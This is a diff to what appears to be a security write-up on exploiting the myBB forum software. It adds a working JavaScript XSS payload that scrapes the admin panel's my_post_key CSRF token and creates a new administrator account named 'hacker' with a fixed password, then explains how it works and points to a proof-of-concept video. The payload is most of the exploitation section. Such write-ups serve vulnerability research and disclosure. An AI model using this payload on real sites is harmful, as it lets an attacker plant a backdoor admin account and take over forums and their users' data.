@@ -26,11 +26,38 @@ There are several reasons why I chose myBB, however the major one was that devel
 
 # ii. Exploitation
 
-I have modified hakluke's original Wordpress script to work with myBB. 
+I have modified hakluke's original Wordpress script to work with myBB.
+
+Script:
+~~~
+/*
+mybb - adds administrator with username hacker and password hacker12345
+tested on latest version of mybb v1.8.20
+original script by hakluke modified by mqt
+*/
+var mybb_root = "" // don't add a trailing slash
+var req = new XMLHttpRequest();
+var url = mybb_root + "/admin/index.php?module=user-users&action=add";
+var regex = /my_post_key" value="([^"]*?)"/g;
+req.open("GET", url, false);
+req.send();
+var nonce = regex.exec(req.responseText);
+var nonce = nonce[1];
+var params = "my_post_key="+nonce+"&username=hacker&password=hacker12345&confirm_password=hacker12345&email=hacker@hacker.com&usergroup=4&displaygroup=0"; //make sure passwod is 6+ chars
+req.open("POST", url, true);
+req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+req.send(params);
+~~~ 
+
+In short, in order to perform any sensitive action in the myBB Admin Panel, there is a token that is required which is called `my_post_key`. The following script sends a request to the myBB Admin Panel (which seems to have a lifespan of 30 minutes before asking the user to reauthenticate), retrieves the source and parses it looking for `my_post_key`. Once it finishes, it sends a subsequent request to add a user to the Administrator group with the username as hacker and password as hacker12345.
 
 
 Here is a video proof of concept demonstrating it in action:
 [video poc]
+
+# iii. Conclusion
+
+[note about xss]
 
 
 As always, thank you for reading,
